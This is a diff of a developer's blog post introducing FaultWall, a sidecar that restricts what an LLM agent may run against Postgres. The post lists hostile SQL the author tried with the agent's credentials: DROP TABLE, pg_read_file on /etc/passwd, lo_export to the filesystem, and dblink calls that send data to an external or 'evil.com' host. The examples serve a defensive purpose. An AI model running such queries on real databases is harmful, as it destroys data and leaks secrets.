@@ -179,22 +179,22 @@
 
     <div class="tldr">
       <h3>TL;DR</h3>
-      <p>I hooked up a Claude Opus 4 agent to my Postgres 16 instance with a LangChain SQL toolkit. It worked great until the model generated a query that missed a WHERE clause and scanned 2 million rows. Postgres roles can't scope permissions to what an agent is doing <em>right now</em>, so I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a>: a sidecar that enforces per-agent, per-task policies using the real Postgres C parser. Blocks dangerous functions, restricts table access by mission, kills violating queries. One Go binary, one YAML config.</p>
+      <p>I hooked up a Claude-powered agent to my Postgres 16 instance with a LangChain SQL toolkit. It worked great until the model generated a query that missed a WHERE clause and scanned 2 million rows. Postgres roles can't scope permissions to what an agent is doing <em>right now</em>, so I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a>: a sidecar that enforces per-agent, per-task policies using the real Postgres C parser. Blocks dangerous functions, restricts table access by mission, kills violating queries. One Go binary, one YAML config.</p>
     </div>
 
     <h2>How it started</h2>
 
-    <p>I was building a data analysis pipeline with LangChain's <code>SQLDatabaseToolkit</code> and Claude Opus 4. The setup is dead simple: give the agent a Postgres connection string, tell it what you want, and it writes the SQL. I had it pulling customer feedback summaries, joining against product tables, generating weekly reports. Worked beautifully for about three weeks.</p>
+    <p>I was building a data analysis pipeline with LangChain's <code>SQLDatabaseToolkit</code> and Claude as the LLM. The setup is dead simple: give the agent a Postgres connection string, tell it what you want, and it writes the SQL. I had it pulling customer feedback summaries, joining against product tables, generating weekly reports. Worked beautifully for about three weeks.</p>
 
-    <p>Then I asked it to "find all feedback about shipping delays" and it generated <code>SELECT * FROM feedback</code> without any filter. Two million rows. CPU pinned at 90% for three minutes. The monitoring didn't catch it because the connection came from a legit database user. Looked like normal app traffic.</p>
+    <p>Then I asked it to "find all feedback about shipping delays" and it generated <code>SELECT * FROM feedback</code> without any filter. Two million rows. CPU pinned at 90% for three minutes. CloudWatch flagged the CPU spike, but the connection came from the same <code>agent_user</code> role that runs normal queries all day. There was no way to tell from the metrics alone that this was an LLM-gone-wrong vs the application doing its thing.</p>
 
     <p>That was the harmless version. I started thinking about what else that same connection string could do. So I opened psql with the agent's credentials and tried a few things:</p>
 
     <ul>
       <li><code>DROP TABLE users;</code> worked. (I rolled it back.)</li>
-      <li><code>SELECT * FROM payments;</code> returned full credit card data. The agent had no business seeing that table.</li>
+      <li><code>SELECT * FROM customers;</code> returned names, emails, phone numbers. The agent only needed the feedback table.</li>
       <li><code>SELECT pg_read_file('/etc/passwd');</code> read server files right through Postgres.</li>
-      <li><code>SELECT dblink('host=evil.com ...')</code> would let you tunnel data to an external server.</li>
+      <li><code>SELECT * FROM dblink('host=... dbname=...', 'SELECT 1')</code> connected to an external Postgres instance. Data exfiltration in one query.</li>
       <li><code>SELECT lo_export(16389, '/tmp/dump.txt');</code> dumps large objects to the filesystem.</li>
     </ul>
 
@@ -282,7 +282,7 @@ SELECT * FROM dblink('host=evil.com', 'SELECT * FROM secrets');</code></pre>
     <p>I tested 11 scenarios on a real Postgres 16 instance running on a separate machine. Not mocks, not unit tests. Actual <code>psql</code> connections, actual <code>pg_terminate_backend()</code> calls. Table blocking, function blocking (pg_sleep, lo_export, pg_read_file), operation restrictions (allowing SELECT but blocking DELETE), unregistered agent rejection, and monitoring unidentified connections. All 11 passed.</p>
 
     <div class="screenshot">
-      <img src="dashboard.jpg" alt="FaultWall dashboard showing agent violations, cost attribution, and query monitoring">
+      <img src="dashboard.jpg" alt="FaultWall dashboard showing agent violations, cost attribution, and query monitoring" width="891" height="2000" loading="lazy">
       <div class="caption">FaultWall dashboard showing 5 blocked violations, connected agents, and per-tenant cost attribution.</div>
     </div>
 
